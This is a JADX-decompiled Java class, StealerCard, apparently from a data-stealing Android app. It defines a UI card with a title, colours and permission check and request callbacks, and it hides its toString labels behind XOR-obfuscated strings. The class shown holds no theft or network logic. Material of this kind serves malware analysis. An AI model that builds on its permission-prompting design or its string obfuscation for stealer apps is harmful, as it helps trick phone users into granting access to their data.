package com.base.template;

import androidx.work.NetworkType$EnumUnboxingLocalUtility;
import kotlin.jvm.functions.Function0;
import kotlin.jvm.functions.Function2;
import kotlin.jvm.internal.Lambda;
import p000.C0000;

/* JADX INFO: loaded from: /Users/xv/pin2/max-gate-apk/output/stage4/classes.dex */
public final class StealerCard {
    public final Lambda checkGranted;
    public final int gradientEnd;
    public final int gradientStart;
    public final Lambda iconDrawer;
    public final String id;
    public final Lambda requestPermission;
    public final String subtitle;
    public final String title;

    /* JADX WARN: Multi-variable type inference failed */
    public StealerCard(String str, String str2, String str3, int i, int i2, Function2 function2, Function0 function0, Function0 function1) {
        this.id = str;
        this.title = str2;
        this.subtitle = str3;
        this.gradientStart = i;
        this.gradientEnd = i2;
        this.iconDrawer = (Lambda) function2;
        this.checkGranted = (Lambda) function0;
        this.requestPermission = (Lambda) function1;
    }

    public final boolean equals(Object obj) {
        if (this == obj) {
            return true;
        }
        if (!(obj instanceof StealerCard)) {
            return false;
        }
        StealerCard stealerCard = (StealerCard) obj;
        return this.id.equals(stealerCard.id) && this.title.equals(stealerCard.title) && this.subtitle.equals(stealerCard.subtitle) && this.gradientStart == stealerCard.gradientStart && this.gradientEnd == stealerCard.gradientEnd && this.iconDrawer.equals(stealerCard.iconDrawer) && this.checkGranted.equals(stealerCard.checkGranted) && this.requestPermission.equals(stealerCard.requestPermission);
    }

    public final int hashCode() {
        return this.requestPermission.hashCode() + ((this.checkGranted.hashCode() + ((this.iconDrawer.hashCode() + ((Integer.hashCode(this.gradientEnd) + ((Integer.hashCode(this.gradientStart) + NetworkType$EnumUnboxingLocalUtility.m(this.subtitle, NetworkType$EnumUnboxingLocalUtility.m(this.title, this.id.hashCode() * 31, 31), 31)) * 31)) * 31)) * 31)) * 31);
    }

    public final String toString() {
        StringBuilder sb = new StringBuilder(C0000.decode(new byte[]{98, 17, 0, 89, 91, 81, 71, 39, 86, 66, 0, 26, 88, 1, 88}, "1ee8745d70d2", 0.0f));
        sb.append(this.id);
        sb.append(C0000.decode(new byte[]{25, 21, 67, 89, 77, 93, 84, 95}, "5570911b", 2));
        sb.append(this.title);
        sb.append(C0000.decode(new byte[]{20, 16, 23, 64, 81, 66, 15, 76, 94, 84, 91}, "80d536f821f8a5", true));
        sb.append(this.subtitle);
        sb.append(C0000.decode(new byte[]{77, 23, 4, 22, 4, 6, 81, 92, 12, 69, 55, 67, 0, 69, 23, 89}, "a7cdeb89b1d7", 0.0f));
        sb.append(this.gradientStart);
        sb.append(C0000.decode(new byte[]{77, 69, 82, 75, 80, 82, 12, 7, 11, 68, 124, 12, 5, 88}, "ae5916ebe09b", 0.0f));
        sb.append(this.gradientEnd);
        sb.append(C0000.decode(new byte[]{31, 23, 81, 82, 12, 12, 117, 74, 82, 64, 93, 67, 94}, "3781cb18", false));
        sb.append(this.iconDrawer);
        sb.append(C0000.decode(new byte[]{30, 66, 1, 10, 1, 86, 89, 37, 16, 3, 10, 65, 87, 6, 95}, "2bbbd5"));
        sb.append(this.checkGranted);
        sb.append(C0000.decode(new byte[]{72, 19, 69, 92, 21, 16, 83, 17, 16, 99, 82, 75, 9, 12, 69, 17, 13, 92, 89, 4}, "d379de6b", false));
        sb.append(this.requestPermission);
        sb.append(C0000.decode(new byte[]{76}, "ecf5f42064c376"));
        return sb.toString();
    }
}
